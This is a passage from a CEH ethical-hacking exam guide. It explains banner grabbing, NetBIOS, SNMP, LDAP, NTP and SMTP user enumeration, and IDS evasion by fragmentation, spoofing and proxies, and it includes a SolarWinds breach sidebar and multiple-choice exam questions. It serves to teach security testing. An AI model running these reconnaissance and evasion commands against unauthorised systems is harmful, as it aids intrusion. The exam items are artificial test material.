pose you sent a Telnet request to port 80 on a machine. The result may look something
like this:

C:\telnet 192.168.1.15 80HTTP/1.1 400 Bad Request
Server: Microsoft – IIS/5.0
Date: Sat, 29 Jan 2011 11:14:19 GMT
Content – Type: text/html
Content – Length: 87
<html><head><title>Error</title></head>
<body>The parameter is incorrect.<body><html>
Connection to host lost.

It’s just a harmless little error message, designed to show an administrator he may have
made a mistake, right? It just happens to also tell an ethical hacker there’s an old version
of Internet Information Services on this machine (IIS/5.0). Other ports can also provide
interesting nuggets. For example, if you’re not sure whether a machine is a mail server,
try typing telnet IPAddress 25. If it is a mail server, you’ll get an answer something like
the following, which I received from a Microsoft Exchange Server:

220 mailserver.domain.com Microsoft ESMTP MAIL Service, Version:
5.0.2195.5329
ready at Sat, 29 Oct 2017 11:29:14 +0200

In addition to testing different ports, you can also use a variety of tools and techniques
for banner grabbing. One such tool is Netcat (which we’ll visit again later in this book).

03-ch03.indd 125 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

126

Known as the “Swiss Army knife of hacking tools,” Netcat is a command-line networking
utility that reads and writes data across network connections using TCP/IP. It’s also a tun-
neling protocol, a scanner, and an advanced hacking tool. To try banner grabbing with
this little jewel, simply type nc <IPAddress or FQDN> <port number>. Some sample
Netcat output for banner grabbing is shown here:

C:\ nc 192.168.1.20 80
HEAD / HTTP/1.0
HTTP/1.1 200 OK
Date: Mon, 28 Oct 2018 22:10:40 EST
Server: Apache/2.0.46 (Unix) (Red Hat/Linux)
Last-Modified: Tues, 18 Jan 2018 11:20:14 PST
ETag: "1986-69b-123a4bc6"
Accept-Ranges: bytes
Content-Length: 1110
Connection: close
Content-Type: text/html

As you can see, banner grabbing is a fairly valuable tool in gathering target informa-
tion. Telnet and Netcat can both perform it, but numerous other tools are available. As a
matter of fact, most port scanners—including the ones we’ve covered already—are fully
capable of banner grabbing and using it in preparing their output.

NetBIOS Enumeration
An acronym for Network Basic Input/Output System, NetBIOS was developed in 1983
by Sytek, Inc., for IBM PC networking. It has morphed and grown since then but
largely still provides the same three services on a network segment: name servicing,
connectionless communication, and some Session layer functions. NetBIOS is not a
networking protocol but rather another one of the creations in networking that was
originally designed to make life easier for us. Part of the idea was to have everything
named so you could easily look up a computer or a user. And, as everything else that was
created to make life easier in networking, it can be corrupted to provide information to
the ethical hacker.

This network device browser service, part of Microsoft Windows operating systems,
was designed to host information about all the machines within the domain or TCP/
IP network segment. A “master browser” coordinates list information and allows sys-
tems and users to easily find each other. Largely ignored by many in hacking networked
resources—because there are multiple ways to get this information—NetBIOS is still a
valuable resource in gathering information and will definitely show up on your exam!

NOTE There’s a ton o details involved in NetBIOS we’re not getting into
here, such as browser roles, browse order, implementation details on
Windows networks, and so on, mainly because none o that is tested. This is
not to say it’s irrelevant to your uture as an ethical hacker, though. Do some
reading on the subject, and learn how the roles work inside a network.
When you put it all together, it’ll open some really interesting avenues or
your hacking eorts.

03-ch03.indd 126 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

127

A NetBIOS name is a 16-character ASCII string used to identify network devices—15
characters define the name, and the 16th character is reserved for the service or name
record type. If you’d like to see it on your current Windows system, just use the built-in
utility nbtstat. Typing nbtstat on its own in a command line brings up a host of switches
to use for information-gathering purposes. Try nbtstat -n for your local table, nbtstat
-A IPAddress for a remote system’s table (substituting lowercase -a allows you to use the
computer name instead of the IP address), and nbtstat -c for the cache. For example,
consider this output:

NetBIOS Remote Machine Name Table

Name Type Status
---------------------------------------------
ANY_PC <00> UNIQUE Registered
WORKGROUP <00> GROUP Registered
ANY_PC <20> UNIQUE Registered
WORKGROUP <1E> GROUP Registered
WORKGROUP <1D> UNIQUE Registered
..__MSBROWSE__.<01> GROUP Registered

MAC Address = 78-AC-C0-BA-E6-F2

The 00 identifies the computer’s name and the workgroup it’s assigned to. The 20 tells
us file and print sharing is turned on. The 1E tells us it participates in NetBIOS browser
elections, and the 1D tells us this machine is currently the master browser for this little
segment. And, for fun, the remote MAC address is listed at the bottom. Granted, this
isn’t world-beating information, but it’s not bad for free, either. Table 3-6 summarizes the
codes and types you’ll probably need to remember.

EXAM TIP NetBIOS enumeration questions will generally be about three
things:

—Identiying the code and type
—The act NetBIOS name resolution doesn’t work at all on IPv6
—Which tools can be used to perorm it

Don’t lose too much sleep over this, though—there won’t be more than a
couple questions on this subject.

Table 3-6 Code Type Meaning

NetBIOS Codes <1B> UNIQUE Domain master browser
and Types

<1C> UNIQUE Domain controller

<1D> GROUP Master browser or the subnet

<00> UNIQUE Hostname

<00> GROUP Domain name

<03> UNIQUE Service running on the system

<20> UNIQUE Server service running

03-ch03.indd 127 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

128

Nbtstat isn’t the only tool available for NetBIOS enumeration. Hyena (www
.systemtools.com) is a multipurpose tool to mention regarding NetBIOS enumera-
tion. It’s a GUI-based tool that shows shares, user logon names, services, and other data
that would be useful in securing Microsoft systems. Some other tool options include
Winfingerprint (https://packetstormsecurity.com/files/38356/winfingerprint-0.6.2.zip
.html), NetBIOS Enumerator (http://nbtenum.sourceforge.net), and NSAuditor (http://
nsauditor.com).

SNMP Enumeration
Another enumerating technique of note for your exam is exploiting Simple Network
Management Protocol (SNMP). SNMP was designed to manage IP-enabled devices
across a network. As a result, if it is in use on the subnet, you can find out loads of infor-
mation with properly formatted SNMP requests. Later versions of SNMP make this a
little more difficult, but plenty of systems are still using the protocol in version 1.

SNMP consists of a manager and agents, and it works much like a dispatch center. A
central management system set up on the network makes requests of SNMP agents on
the devices. These agents respond to the requests by going to a big virtual filing cabinet
on each device called the Management Information Base (MIB). The MIB holds infor-
mation, and it’s arranged with numeric identifiers (called object identifiers, or OIDs) from
general information to the very specific. The request points out exactly what information
is requested from the MIB installed on that device, and the agent responds with only
what is asked for. MIB entries can identify what the device is, what operating system is
installed, and even usage statistics. In addition, some MIB entries can be used to actually
change configuration settings on a device. When the SNMP management station asks a
device for information, the packet is known as an SNMP GET request. When it asks the
agent to make a configuration change, the request is an SNMP SET request.

NOTE There are two types o managed objects in SNMP—scalar and tabular.
Scalar deines a single object, whereas tabular deines multiple related
objects that can be grouped together in MIB tables.

SNMP uses a community string as a form of password. The read-only version of the
community string allows a requester to read virtually anything SNMP can drag out of
the device, whereas the read-write version is used to control access for the SNMP SET
requests. Two major downsides are involved in the use of both these community string
passwords. First, the defaults, which are all active on every SNMP-enabled device right
out of the box, are ridiculously easy. The read-only default community string is public,
whereas the read-write string is private. Assuming the network administrator left SNMP
enabled and/or did not change the default strings, enumerating with SNMP is a snap.

EXAM TIP Weirdly enough, ECC seems really concerned with protocol
encryption, authentication, and message integrity unctions. You should
know that NTPv3 and SMTPv3 both provide these.

03-ch03.indd 128 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

129

The second problem with the strings is that they are sent in clear text (at least in
SNMPv1). So, even if the administrators took the time to change the default commu-
nity strings on all devices (and chances are better than not they’ll miss a few here and
there), all you’ll need to do to grab the new strings is watch the traffic—you’ll eventually
catch them flying across the wire. However, keep in mind that versioning matters when
it comes to SNMP. Because SNMP version 3 encrypts the community strings, enu-
meration is harder to pull off. Additionally, although public and private are the default
strings, some devices are configured to use other strings by default. It might be worth-
while researching them before you begin your efforts.

Tools you can use to enumerate with SNMP are seemingly endless. SNMPCheck,
built into Parrot OS, Kali Linux, and others, is an open source (GPL license) tool that
places SNMP enumeration output is an easy-to-read format. Engineer’s Toolset (www
.solarwinds.com) and OpUtils (www.manageengine.com) are viable options.

Sunburst
I’d planned on adding a writeup later in this book on what Microsoft President
Brad Smith said in February 2021 was “the largest and most sophisticated attack the
world has ever seen,” but as soon as I saw SolarWinds in print here, I knew a lot of
you astute observers of the news would immediately object to seeing it listed as a
tool for enumeration. First and foremost, before we begin and before you complain
about it being mentioned as an SNMP enumeration tool, EC-Council still lists
SolarWinds Engineer Toolset as a tool for enumeration, and I’m going to stick with
what the folks who write the exam have listed in their official courseware. Secondly,
it’s still in place and in use on systems throughout the world and will most likely
continue to be so—at least for the immediate future, anyway. So, we’ll take a brief
pause from scanning and enumeration here to discuss how the attack came about,
what happened, who was affected, and where we currently stand.

In fall of 2019, a security researcher notified SolarWinds that one of its FTP
servers had a very weak password protecting it (solarwinds123) and warned any
hacker could upload malicious files that would then be distributed to SolarWinds
customers. At the time, per the New York Times, SolarWinds had no chief informa-
tion security officer, and speculation after the fact from a number of researchers
and columnists—not to mention a class action lawsuit filed in January of 2021—
pointed to a general lax attitude toward overall security. At some point either before
this was noted and/or between November 2019 and December 2020, an attacker
(or several) connected to the nearly unprotected FTP server and introduced one or
more malware packages in a SolarWinds library. Afterward, when a client connected
to update their SolarWinds Orion package, the malware was installed and went to
work. And since the update occurred using a trusted certificate, the malware and its
activities went unnoticed.

(continued )

03-ch03.indd 129 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

130

On December 13, 2020, the Washington Post reported multiple government
agencies and corporate entities were breached through SolarWinds’s Orion software.
Two days later, on the 15th, SolarWinds reported the breach to the U.S. Securi-
ties and Exchange Commission but, for whatever reason, continued to distribute
malware-infected updates until the 21st. As an interesting sidenote to all this, per
German IT news portal Heise.de, SolarWinds support staff had been encouraging
customers to disable antimalware tools before installing SolarWinds products before
even knowing the exploit had occurred.

At least 18,000 of the 33,000 Orion customers were affected, involving versions
2019.4 through 2020.2.1, released between March 2020 and June 2020. Hack-
ers taking advantage of the backdoor acquired superuser access to SAML token-
signing certificates, which were then used to forge new tokens allowing trusted and
privileged access to resources. FireEye reported that it had found “indications of
compromise dating back to the spring of 2020”and named the malware Sunburst.
While the full magnitude of damage hasn’t, and probably never will be, calculated,
on January 14, 2021, CRN.com reported that the attack had cost cyber insurance
firms at least $90 million. So far.

So what lessons are to be learned from all this? In my humble opinion, there
are several, ranging from keeping the simple things important to having security
mindedness first and foremost for everyone. But one of the most disheartening and
concerning parts of this, to me, is the lesson captured in the microcosm of the Solar-
Winds CEO, Kevin Thompson, blaming a company intern for using the insecure
password on their update server.

Security often gets turned into a blame game, with folks from leadership all the
way down to ground floor pointing fingers at everyone else instead of taking respon-
sibility and just doing their job. Unfortunately, this example is not just the reality, but
represents the majority of interaction in security events. If we learn nothing else at all
from this, I hope we get one lesson right: security is our job. Do it, and do it right.

Other Enumeration Options
The Lightweight Directory Access Protocol (LDAP) is designed to be queried, so it pres-
ents a perfect enumeration option. LDAP sessions are started by a client on TCP port
389 connecting to a Directory System Agent (DSA). The request queries the hierarchi-
cal/logical structure within LDAP and returns an answer using Basic Encoding Rules
(BER). So what can you get out of LDAP using this? Valid user names, domain informa-
tion, addresses and telephone numbers, system data, and organizational structure, among
other items. Tools such as Softerra LDAP Administrator (www.ldapadministrator.com),
JXplorer (http://jxplorer.org), LEX (http://ldapexplorer.com), and LDAP Admin Tool
(www.ldapsoft.com) all work well and are fairly intuitive and user friendly. Oh, and don’t
forget the built-in Active Directory Explorer in Windows systems (Microsoft’s propri-
etary-ish version of LDAP). It can make LDAP information gathering quick and easy.

03-ch03.indd 130 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

131

SMTP VRFY command: SMTP EXPN command: SMTP RCPT TO command:
$ telnet 172.17.15.12 $ telnet 172.17.15.12 $ telnet 172.17.15.12

Trying 172.17.15.12… Trying 172.17.15.12… Trying 172.17.15.12…

Connected to 172.17.15.12. Connected to 172.17.15.12. Connected to 172.17.15.12.

Escape character is ‘^]’. Escape character is ‘^]’. Escape character is ‘^]’.

220 Anymailserver ESMTP Sendmail 8.9.3 220 AnymailserverESMTP Sendmail8.9.3
220 AnymailserverESMTP Sendmail8.9.3

HELO HELO
501 HELO requires domain address HELO

501 HELO requires domain address
501 HELO requires domain address

HELO x HELO x
HELO x

250 Anymailserver Hello [192.168.15.22], 250 AnymailserverHello [192.168.15.22],
250 AnymailserverHello [192.168.15.22],

pleased to meet you pleased to meet you pleased to meet you

VRFY Matt EXPN Matt MAIL From: Matt

250 Super-User 250 Super-User 250 Matt… Sender ok

<Matt@Anymailserver> <Matt@Anymailserver> RCPT TO: Angie… Recipient ok

VRFY Brad EXPN Brad RCPT TO: Brad

550 Brad… User unknown 550 Brad… User unknown 550 Brad… User unknown

Figure 3-12 SMTP commands

Other protocols of note for enumeration efforts include NTP and SMTP. Network
Time Protocol (running UDP on port 123) does exactly what the name implies—it sets
the time across your network. Querying the NTP server can give you information such as
a list of systems connected to the server (name and IP address) and possibly IP addresses
of internal systems (that is, if the NTP box is in the DMZ and serves machines inside
the network, information can be pulled on the internal machines). Several tools for NTP
enumeration are available, including NTP Server Scanner (http://bytefusion.com) and
AtomSync (atomsync.com), but you can also use Nmap and Wireshark if you know what
you’re looking for. Commands for NTP enumeration include ntptrace, ntpdc, and ntpq.

We’ve already talked some about e-mail information gathering in previous sections,
but a little more info on Simple Mail Transfer Protocol (SMTP) is required here for
your exam and for enumeration. SMTP holds multiple commands (12), but three are
commonly used and will probably find their way on your exam—VRFY (validates user),
EXPN (provides the actual delivery addresses of mailing lists and aliases), and RCPT TO
(defines recipients)—and servers respond differently to these commands. Their responses
can tell us which are valid user names and which are invalid user names. Figure 3-12
shows an example of these responses in action.

EXAM TIP Know SMTP commands (VRFY, EXPN, and RCPT TO) and how to
use them in Telnet well.

Chapter Review
Scanning is the process of discovering systems on the network and taking a look at
what open ports and applications may be running. EC-Council’s scanning methodology
phases include the following: check for live systems, check for open ports, scan beyond
IDS, perform banner grabbing, scan for vulnerabilities, draw network diagrams, and
prepare proxies.

03-ch03.indd 131 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

132

When two TCP/IP-enabled hosts communicate with each other, data transfer is
either connectionless or connection-oriented. Connectionless communication is “fire
and forget,” meaning the sender can simply fire as many segments as it wants out to the
world, relying on other upper-layer protocols to handle any problems. At the Transport
layer, connectionless communication is accomplished with UDP. Application protocols
that make use of this transport method move very small amounts of data and usually
move them inside a network structure (not across the Internet). Examples of protocols
making use of UDP are TFTP, DNS, and DHCP.

Connection-oriented communications using TCP are slower than connectionless but
are a much more orderly form of data exchange. Senders reach out to recipients, before
data is ever even sent, to find out whether they’re available and whether they’d be willing
to set up a data channel. Once data exchange begins, the two systems continue to talk
with one another. Six flags can be set in the TCP header: URG (Urgent), ACK (Acknowl-
edgment), PSH (Push), RST (Reset), SYN (Synchronize), and FIN (Finish). A session
must be established between two systems for data exchange. This is accomplished via a
three-way handshake, listed as “SYN, SYN/ACK, ACK.”

The Source Port and Destination Port fields in TCP or UDP communication define
the protocols that will be used to process the data. The port numbers range from 0
to 65,535 and are split into three different groups: well-known (0–1023), registered
(1024–49,151), and dynamic (49,152–65,535). A system is said to be listening for a port
when it has that port open. Typing netstat -an displays all connections and listening
ports, with addresses and port numbers in numerical form.

IPv4 has three main address types—unicast (acted on by a single recipient), multicast
(acted on only by members of a specific group), and broadcast (acted on by everyone in
the network). To determine which network an IP address belongs to, the address must be
looked at as network bits and host bits. A subnet mask is a binary pattern that is matched
against any IP address to determine which bits belong to the network side of the address.
Rules involving IPv4 addresses include the following:

• If all the bits in the Host field are 1’s, the address is a broadcast (that is, anything
sent to that address will go to everything on that network).

• If all the bits in the Host field are set to 0’s, that’s the network address.
• Any combination other than all 1’s and 0’s present the usable range of addresses

in that network.

To view the network and host portions of an address, first convert the IP address to
binary, convert the subnet mask to binary, and stack the two. Every bit from left to right
is considered part of the network ID until you hit a zero in the subnet ID. Next, you can
manipulate the host bits to show all 0’s, set all the host bits off except the first, set all the
host bits on except the last, and set all the host bits on to show the network ID and the
first, last, and broadcast addresses, respectively.

A ping sweep is the easiest method for identifying active machines on the network. An
ICMP Echo Request (Type 8) message is sent to each address on the subnet. Those that
are up (and not filtering ICMP) reply with an ICMP Echo Reply (Type 0).

03-ch03.indd 132 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

133

Port scanning is the method by which systems on a network are queried to see which
ports they are listening to. One of the more important port-scanning tools available
is Nmap, which can perform many different types of scans (from simply identifying
active machines to port scanning and enumeration) and can also be configured to
control the speed at which the scan operates. In general, the slower the scan, the less
likely you are to be discovered and the more reliable the results. Nmap comes in both a
command-line version and a GUI version (known as Zenmap) and works on multiple
OS platforms. The Nmap syntax is simple:

nmap <scan options> <target>

Multiple scan options (or switches) are available, and combining them can produce
several scan options. The “s” commands determine the type of scan to perform, the “P”
commands set up ping sweep options, and the “o” commands deal with output. The “T”
commands deal with speed and stealth, with the serial methods taking the longest amount
of time. Parallel methods are much faster because they run multiple scans simultaneously.

There are several generic scan types for port scanning: full connect (also known as
TCP connect or full open scan), stealth (also known as a half-open scan and as a SYN
scan), inverse TCP flag, XMAS, ACK flag probe, IDLE, and TCT Maimon. Full (TCP
connect) and stealth scans receive a SYN/ACK on open ports and an RST on closed
ports. XMAS and inverse TCP scans receive no response on an open port and an RST on
closed ports. Additionally, neither works on Windows machines.

Two main scanning efforts involving SCTP are SCTP INIT scanning and SCTP
COOKIE Scanning. Per Nmap.org, an SCTP INIT scan “…is the SCTP equivalent of
a TCP SYN scan. It can be performed quickly, scanning thousands of ports per second
on a fast network not hampered by restrictive firewalls. It is relatively unobtrusive and
stealthy, since it never completes SCTP associations and allows clear, reliable differentia-
tion between the open, closed, and filtered states.”

Hping (Hping2 or Hping3) is another powerful tool for both ping sweeps and port
scans, and is also a handy packet-crafting tool for TCP/IP. Hping works on Windows
and Linux versions and runs nearly any scan Nmap can put out. A full and complete
breakdown of all switches and syntax can be found on Hping’s man page (www.hping
.org/manpage.html).

Hiding your activities from prying security-professional eyes can be done using
fragmented packets, IP address spoofing, source routing, and proxies. In fragmenting
packets, the idea isn’t to change the scan itself but to crack apart the packets before
they’re sent so that the IDS can’t recognize them. If you split the TCP header into sev-
eral packets, all the IDS may see is useless chatter. For example, an Nmap command
like nmap -sS -A -f 172.17.15.12 might work to fragment a SYN scan (while OS
fingerprinting along the way).

Spoofing an IP address is exactly what it sounds like: you use a packet-crafting tool
of some sort to obscure the source IP address of packets sent from your machine. Many
tools are available for this—Hping, Scapy, and Komodia Redirector, for example. Spoof-
ing an IP address means any data coming back to the fake address will not be seen by
the attacker. For example, if you spoof an IP address and then perform a TCP scan, the
information won’t make its way back to you.

03-ch03.indd 133 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

134

Source routing was originally designed to allow applications to specify the route a
packet takes to a destination, regardless of what the route tables between the two systems
say. The attacker can use an IP address of another machine on the subnet and have all
the return traffic sent back, regardless of which routers are in transit. Protections against
source-routing attacks are prevalent and effective—not to mention most firewalls and
routers detect and block source-routed packets—so this may not be your best option.

A proxy is nothing more than a system you set up to act as an intermediary between
you and your targets. In many instances, proxies are used by network administrators
to control traffic and provide additional security for internal users, or for things like
remotely accessing intranets. Hackers, though, can use that technology in reverse—
sending commands and requests to the proxy and letting the proxy relay them to the
targets. So, for evasion purposes, anyone monitoring the subnet sees the proxy trying all
these actions, not the hacker. It’s important to remember that a proxy isn’t just a means
for obfuscating the source. Proxies are used for a variety of things.

Proxying can be done from a single location or spread across multiple proxies to fur-
ther disguise the original source. If you want to set up proxy chains, where multiple prox-
ies further hide your activities, you can use tools such as Proxy Switcher, ProxyChains,
and Proxifier.

Tor basically works by installing a small client on the machine, which then gets a list
of other clients running Tor from a directory server. The client then bounces Internet
requests across random Tor clients to the destination, with the destination end having
very little means to trace the original request back. Communication between Tor clients
is encrypted, with only the last leg in the journey—between the Tor “cloud” and the
destination—sent unencrypted.

Another method for disguising your identity, at least for port 80 (HTTP) traffic, is to
use an anonymizer. Anonymizers are services on the Internet that make use of a web proxy
to hide your identity. Some anonymizers referenced by ECC include Guardster, Ultrasurf,
Psiphon, and Tails. Tails isn’t an application, per se; it’s an actual live OS you can run from
a USB that anonymizes the source and leaves no trace on the system you’re on.

Vulnerability scanning involves running a tool against a target to see what vulnerabili-
ties it may hold. Scanners of note include Nessus, MBSA, GFI LanGuard, and OpenVAS.

When we enumerate a target, we’re moving from passive information gathering to
a much more active state. No longer satisfied with just knowing which ports are open,
we now want to find targets such as open shares and any easy-to-grab user account
information.

Microsoft Windows machines—everything from old Windows 2000 to Windows 10
systems—will constitute the vast majority of your targets in the real world, so it’s impor-
tant to know some security basics before enumerating them. User rights are granted via
an account’s membership within a group and determine which system tasks an account
is allowed to perform. Permissions are used to determine which resources an account has
access to. The method by which Windows keeps track of which account holds what rights
and permissions comes down to SIDs and RIDs. A security identifier (SID) identifies
user, group, and computer accounts and follows a specific format. A resource identifier
(RID) is a portion of the overall SID, identifying a specific user, computer, or domain.

03-ch03.indd 134 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

135

SIDs are composed of an S, followed by a revision number, an authority value, a
domain or computer indicator, and a RID. The RID portion of the identifier starts at
500 for the administrator account. The next account on the system, Guest, is RID 501.
All users created for the system start at 1000 and increment from that point forward—
even if their user names are re-created later.

Accounts are identified by their SID (and associated RID), of course, but the pass-
words for them must be stored somewhere, too. In Windows, passwords are stored in
C:\Windows\System 32\Config\SAM. The SAM database holds encrypted versions of
all the local passwords for accounts on the machine. For those machines that are part of
a domain, the passwords are stored and handled by the domain controller.

Linux systems use a user ID (UID) and a group ID (GID) in much the same way as
Windows uses SIDs and RIDs. On a Linux machine, these can be found in the /etc/
passwd file.

Banner grabbing involves sending an unsolicited request to an open port to see what,
if any, default message (banner) is returned. Depending on what version of the appli-
cation is running on the port, the returned banner (which could be an error message,
HTTP header, or login message) can indicate a potential vulnerability for the hacker to
exploit. ECC defines two different categories of banner grabbing—active and passive.
Active banner grabbing involves sending specially crafted packets to remote systems and
comparing responses to determine the OS. Passive banner grabbing involves reading
error messages, sniffing network traffic, or looking at page extensions.

A common method of performing banner grabbing is to use a simple tool already built
into most operating systems, Telnet. For example, if you simply type telnet IPAddress,
you’ll send TCP packets to the recipient with the destination port set to 23. However,
you can also point it at any other port number explicitly to test for connectivity. If the
port is open, you’ll generate some form of banner response.

Another tool for banner grabbing (and other uses) is Netcat. Known as the “Swiss
Army knife of hacking tools,” Netcat is a command-line networking utility that reads
and writes data across network connections using TCP/IP. It’s also a tunneling protocol,
a scanner, and an advanced hacking tool. To try banner grabbing with this little jewel,
simply type nc <IPAddress or FQDN> <port number>.

NetBIOS, a browser service that’s part of Microsoft Windows operating systems, was
designed to host information about all the machines within the domain or TCP/IP
network segment. A NetBIOS name is a 16-character ASCII string used to identify
network devices—15 characters are used to define the name while the 16th character is
reserved for the service or name record type. The built-in utility nbtstat can be used to
provide NetBIOS information for enumeration purposes. Within the nbtstat response,
the code, type, and name can be used to gather information. NetBIOS enumeration
questions will generally be about three things:

• Identifying the code and type
• The fact NetBIOS name resolution doesn’t work at all on IPv6
• Which tools can be used to perform it

03-ch03.indd 135 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

136

SNMP was designed to manage IP-enabled devices across a network. As a result, if
it is in use on the subnet, you can find out loads of information with properly format-
ted SNMP requests. SNMP consists of a manager and agents, and it works much like
a dispatch center. A central management system set up on the network makes requests
of SNMP agents on the devices. These agents respond to the requests by going to a big
virtual filing cabinet on each device called the Management Information Base (MIB).
The MIB holds information, and it’s arranged with numeric identifiers (called object
identifiers, or OIDs), from general information to the very specific. The request points
out exactly what information is requested from the MIB installed on that device, and
the agent responds with only what is asked for. MIB entries can identify what the device
is, what operating system is installed, and even usage statistics. In addition, some MIB
entries can be used to actually change configuration settings on a device. When the
SNMP management station asks a device for information, the packet is known as an
SNMP GET request. When it asks the agent to make a configuration change, the request
is an SNMP SET request.

There are two types of managed objects in SNMP—scalar and tabular. Scalar defines
a single object, whereas tabular defines multiple related objects that can be grouped
together in MIB tables.

SNMP uses a community string as a form of password. The read-only version of the
community string allows a requester to read virtually anything SNMP can drag out of
the device, whereas the read-write version is used to control access for the SNMP SET
requests. Two major downsides are involved in the use of both these community string
passwords. First, the defaults, which are all active on every SNMP-enabled device right
out of the box, are ridiculously easy. The read-only default community string is public,
whereas the read-write string is private. Assuming the network administrator left SNMP
enabled and/or did not change the default strings, enumerating with SNMP is a snap.

Lightweight Directory Access Protocol (LDAP) is designed to be queried, so it presents
a perfect enumeration option. LDAP sessions are started by a client on TCP port 389
connecting to a Directory System Agent (DSA). The request queries the hierarchical/
logical structure within LDAP and returns an answer using Basic Encoding Rules (BER).
You can pull valid user names, domain information, addresses and telephone numbers,
system data, and organizational structure information this way. Tools include Softerra
LDAP Administrator, JXplorer, LEX, LDAP Admin Tool, and the built-in Active Direc-
tory Explorer in Windows systems.

Network Time Protocol (running UDP on port 123) sets the time across your net-
work, and querying the NTP server can give you information such as a list of systems
connected to the server (name and IP address) and possibly the IP addresses of internal
systems (if the NTP box is in the DMZ and serves machines inside the network, infor-
mation can be pulled on the internal machines). Several tools for NTP enumeration are
available, but you can also use Nmap and Wireshark if you know what you’re looking for.
Commands for NTP enumeration include ntptrace, ntpdc, and ntpq.

Simple Mail Transfer Protocol (SMTP) holds three commands helpful in
enumeration—VRFY (which validates user), EXPN (which provides the actual delivery
addresses of mailing lists and aliases), and RCPT TO (which defines recipients)—and
servers respond differently to these commands. Their responses can tell us which are valid
user names and which are invalid user names.

03-ch03.indd 136 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

137

Questions
1. A member of your team enters the following command:

nmap -sV -sC -O -traceroute IPAddress

Which of the following Nmap commands performs the same task?
A. nmap -A IPAddress
B. nmap -all IPAddress
C. nmap -Os IPAddress
D. nmap -aA IPAddress

2. You want to perform banner grabbing against a machine (168.15.22.4) you
suspect as being a web server. Assuming you have the correct tools installed,
which of the following command-line entries will successfully perform a banner
grab? (Choose all that apply.)
A. telnet 168.15.22.4 80
B. telnet 80 168.15.22.4
C. nc -v -n 168.15.22.4 80
D. nc -v -n 80 168.15.22.4

3. You’ve decided to begin scanning against a target organization but want to keep
your efforts as quiet as possible. Which IDS evasion technique splits the TCP
header among multiple packets?
A. Fragmenting
B. IP spoofing
C. Proxy scanning
D. Anonymizer

4. One of your team members is analyzing TTL fields and TCP window sizes in
order to fingerprint the OS of a target. Which of the following is most likely
being attempted?
A. Online OS fingerprinting
B. Passive OS fingerprinting
C. Aggressive OS fingerprinting
D. Active OS fingerprinting

5. What flag or flags are sent in the segment during the second step of the TCP
three-way handshake?
A. SYN
B. ACK
C. SYN/ACK
D. ACK/FIN

03-ch03.indd 137 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

138

6. You are port scanning a system and begin sending TCP packets with the ACK
flag set. Examining the return packets, you see a return packet for one port has
the RST flag set and the TTL is less than 64. Which of the following is true?
A. The response indicates an open port.
B. The response indicates a closed port.
C. The response indicates a Windows machine with a nonstandard TCP/IP stack.
D. ICMP is filtered on the machine.

7. An ethical hacker is ACK-scanning against a network segment he knows is
sitting behind a stateful firewall. If a scan packet receives no response, what
does that indicate?
A. The port is filtered at the firewall.
B. The port is not filtered at the firewall.
C. The firewall allows the packet, but the device has the port closed.
D. It is impossible to determine any port status from this response.

8. Which flag forces a termination of communications in both directions?
A. RST
B. FIN
C. ACK
D. PSH

9. You are examining a host with an IP address of 52.93.24.42/20 and want to
determine the broadcast address for the subnet. Which of the following is the
correct broadcast address for the subnet?
A. 52.93.24.255
B. 52.93.0.255
C. 52.93.32.255
D. 52.93.31.255
E. 52.93.255.255

10. Which port number is used by default for syslog?
A. 21
B. 23
C. 69
D. 514

03-ch03.indd 138 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

139

11. Which of the following commands would you use to quickly identify live targets
on a subnet? (Choose all that apply.)
A. nmap -A 172.17.24.17
B. nmap -O 172.17.24.0/24
C. nmap -sn 172.17.24.0/24
D. nmap -PI 172.17.24.0/24

12. You’re running an IDLE scan and send the first packet to the target machine.
Next, the SYN/ACK packet is sent to the zombie. The IPID on the return packet
from the zombie is 36754. If the starting IPID was 36753, in what state is the
port on the target machine?
A. Open
B. Closed
C. Unknown
D. None of the above

13. Which ICMP message type/code indicates the packet could not arrive at the
recipient due to exceeding its time to live?
A. Type 11
B. Type 3, Code 1
C. Type 0
D. Type 8

14. An ethical hacker is sending TCP packets to a machine with the SYN flag set.
None of the SYN/ACK responses on open ports is being answered. Which type
of port scan is this?
A. Ping sweep
B. XMAS
C. Stealth
D. Full

15. Which of the following statements is true regarding port scanning?
A. Port scanning’s primary goal is to identify live targets on a network.
